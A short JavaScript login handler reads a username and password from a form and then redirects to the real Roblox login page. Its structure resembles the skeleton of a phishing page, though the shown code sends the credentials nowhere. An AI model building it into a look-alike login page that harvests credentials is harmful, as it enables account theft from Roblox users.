function handleLogin(event) {
    event.preventDefault(); // Prevent the default form submission

    // Get the username and password from the form
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // You can add additional validation here if needed

    // Redirect to the actual Roblox login page
    window.location.href = 'https://www.roblox.com/login';
}
